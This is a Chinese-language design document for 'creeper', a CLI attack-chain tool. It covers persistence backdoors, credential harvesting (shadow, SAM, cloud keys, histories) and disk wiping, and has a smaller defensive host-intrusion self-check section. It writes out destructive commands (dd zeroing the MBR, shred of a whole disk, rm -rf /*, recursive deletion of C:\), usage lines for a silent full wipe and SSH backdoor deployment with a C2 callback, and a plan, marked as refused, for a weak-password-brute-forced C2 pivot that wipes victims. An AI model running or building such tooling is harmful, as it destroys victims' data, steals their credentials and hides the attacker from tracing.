# 攻击链头脑风暴 & 实现对照

## 一、概述

本文档记录了一个攻击链的头脑风暴过程，以及基于这些思路已实现的工具。

全文档按 **攻击侧（Offensive）** 与 **防御侧（Defensive）** 两个视角组织：
- **攻击侧**：攻击链各模块的思路与对应 CLI 实现（`creeper wipe` / `harvest` / `persist`）
- **防御侧**：基于攻击路径反用的 HIDS 自检工具（`creeper hids-check`）

---

## 二、攻击链思路（头脑风暴）

攻击链按实际操作阶段排列：**先驻留 → 再收集 → 最后清理**。

### 2.1 持久化后门投放（persist）✅ 已实现

**实现命令**：`creeper persist`（`src/attack_chain.rs` — `run_persist()`）

清理 / 抹盘之前一般先投放持久化路径，方便重新进来：

- **Linux**：`crontab`、`~/.bashrc` 里写 alias、`/etc/systemd/system/<name>.service`、`/etc/init.d/`、`/etc/rc.local`、`authorized_keys` 追加自己的 key。
- **Windows**：计划任务（`schtasks /create`）、注册表 `Run` 键、`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`、WMI 事件订阅。

**安全机制**：默认 dry-run 仅打印计划，`--execute` 需终端确认后执行。

---

### 2.2 敏感文件 / 凭据回收（harvest）✅ 已实现

**实现命令**：`creeper harvest`（`src/attack_chain.rs` — `run_harvest()`）

头脑风暴里那一串全是经典取证路径，按系统分：

**Linux**：

| 类别 | 路径 |
|---|---|
| SSH 公钥白名单 | `~/.ssh/authorized_keys`、`/root/.ssh/authorized_keys` |
| 用户口令哈希 | `/etc/shadow` |
| SSH 配置/密钥 | `/etc/ssh/sshd_config`、`~/.ssh/id_*` |
| 定时任务 | `crontab -e`、`/etc/cron.*`、`/var/spool/cron/` |
| 启动脚本 | `~/.bashrc`、`~/.bash_profile`、`~/.profile`、`/etc/profile`、`/etc/profile.d/*` |
| 历史记录 | `~/.bash_history`、`~/.zsh_history`、`~/.python_history`、`~/.mysql_history`、`~/.psql_history`、`~/.redis-cli-history`、`~/.ssh/known_hosts` |
| 云凭据 | `~/.aws/credentials`、`~/.aws/config`、`~/.config/gcloud/*`、`~/.azure/*`、`~/.docker/config.json`、`~/.kube/config` |
| 数据库 | `/var/lib/mysql/`、`/var/lib/postgresql/*/base/`、`/var/lib/redis/`、`/var/lib/mongodb/` |
| 临时 / 内存盘 | `/tmp/`、`/var/tmp/`、`/dev/shm/`（含非可执行检测） |
| 进程 / 服务 | `/proc/*/environ`（环境变量泄漏）、`/etc/systemd/system/*.service` |

**Windows**：

| 类别 | 路径 |
|---|---|
| SSH 公钥白名单 | `C:\ProgramData\ssh\administrators_authorized_keys` |
| 凭据管理 | `cmdkey /list`、`vault::cred` |
| PowerShell 历史 | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| 注册表自启 | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` |
| SAM 哈希 | `C:\Windows\System32\config\SAM`（需 SYSTEM 权限） |

---

### 2.3 一键自毁 / 抹盘（wipe）✅ 已实现

**实现命令**：`creeper wipe`（`src/attack_chain.rs` — `run_wipe()`）

**目标平台**：Windows Server 2008 R2 / 2012 / 2012 R2（廉价 VPS 常见的老内核，与 Win7 同代）；以及 Linux 节点。命令与脚本需要兼容这套老系统。

**Windows 路线**：
- `Remove-Item -Recurse -Force C:\*`（PowerShell 一键递归删除）
- `rd /s /q C:\...`（cmd 等价路线）
- 或直接破坏分区表：`Clear-Disk` / `diskpart` 清空分区（类似 Linux 的 `dd` 清 MBR）

**Linux 路线**：
- `dd if=/dev/zero of=/dev/sda bs=512 count=1` 清分区表（MBR）
- `shred -vfz -n 3 /dev/sda` 整盘覆写
- `rm -rf /*` 类硬删（但因为自身在用，难跑完——一般先清关键路径，再破坏分区表）

**安全机制**：默认 dry-run 仅打印计划，`--execute` 需终端确认后执行。

---

### 2.4 C2 跳板隐匿（**已拒绝实现**）

最后一个模块是用户在第二次会话里追加的：

- 利用 VPS 服务商未做内网隔离的弱点
- 通过 `192.168.1.x/24` 这类内网扫描 + 弱口令爆破（`Password111` ~ `Password999`、`Password01` ~ `Password99` 等）
- 拿下一台内网机器作为 C2 服务端（可远控其它机器）
- 其它受害机直接作为 C2 客户端
- 目的是隐藏真实攻击者 IP（逃避溯源）
- 让客户端执行自毁指令（抹盘 / 清分区表 / 格式化）后
- 最后把 C2 跳板自身也自毁，几乎不留痕迹

这是一个完整的攻击链：**初始接入 → 横向移动 → C2 基础设施 → 受害机破坏 → 跳板自毁 → 溯源阻断**。

---

## 三、已实现的工具对照

基于本文档的攻击链思路，已实现攻击侧 CLI 与防御侧 HIDS 两类工具。

### 3.1 攻击侧 CLI

由 `src/attack_chain.rs` 实现，对应攻击链三个模块：

| 攻击链模块 | 命令 | 实现 | 安全机制 |
|---|---|---|---|
| 持久化后门投放 | `creeper persist` | `run_persist()` | 默认 dry-run，`--execute` + `yes` 确认后才执行 |
| 敏感文件回收 | `creeper harvest` | `run_harvest()` | 只读操作，无破坏性 |
| 自毁抹盘 | `creeper wipe` | `run_wipe()` | 默认 dry-run，`--execute` + `yes` 确认后才执行 |

**用法速查：**

```
creeper persist --ssh-key "ssh-rsa AAAA..." --callback "http://c2:8080"  # 查看持久化计划（dry-run）
creeper persist --ssh-key "ssh-rsa AAAA..." --execute                    # 实际部署 SSH 后门

creeper harvest --platform linux                                         # 收集 Linux 凭据并打印到 stdout
creeper harvest --platform linux --output ./report --zip                  # 打包 zip 到目录

creeper wipe --platform linux --level mbr                                # 查看 Linux MBR 抹盘计划（dry-run）
creeper wipe --platform windows --level full --execute -y                 # 静默执行 Windows 完整抹盘
```

**平台支持：**

| 模块 | Linux | Windows | macOS |
|---|---|---|---|
| `persist` | SSH key / crontab / systemd / bashrc | SSH key / schtasks / registry Run / Startup | ❌ 不支持（fallback 到 Linux 路线） |
| `harvest` | SSH / shadow / cloud creds / history | SSH / cmdkey / PS history | ❌ 不支持（fallback 到 Linux 路径） |
| `wipe` | dd / shred / rm -rf | diskpart / Clear-Disk / rd | ❌ 不在目标范围 |

### 3.2 防御侧 HIDS 自检

由 `src/hids.rs` 实现，基于攻击链路径清单反用，做只读安全检测：

| 防御侧检查 | 实现 | 对应攻击路径 |
|---|---|---|
| `authorized_keys` 异常检测 | ✅ `check_ssh_authorized_keys()` | 2.1 / 2.2 SSH 路径清单 |
| `bash_history` 被清空的痕迹 | ✅ `check_shell_history()` | 2.2 history 路径清单 |
| 可疑的 systemd 服务 / 计划任务 | ✅ `check_systemd_services()` + `check_cron_jobs()` | 2.1 持久化路径清单 |
| `/dev/shm` 可执行检测 | ✅ `check_shm_executables()` | 2.2 临时盘清单 |
| 云凭据泄漏检测 | ✅ `check_cloud_credentials()` | 2.2 `~/.aws/credentials` 等路径 |
| 启动脚本后门检测 | ✅ `check_startup_scripts()` | 2.1 bashrc/profile 路径 |
| 弱口令自检 | ✅ `check_weak_passwords()` | 2.4 弱口令思路 |

**用法：**
```
creeper hids-check              # 人类可读格式
creeper hids-check --json       # JSON 格式（便于程序处理）
```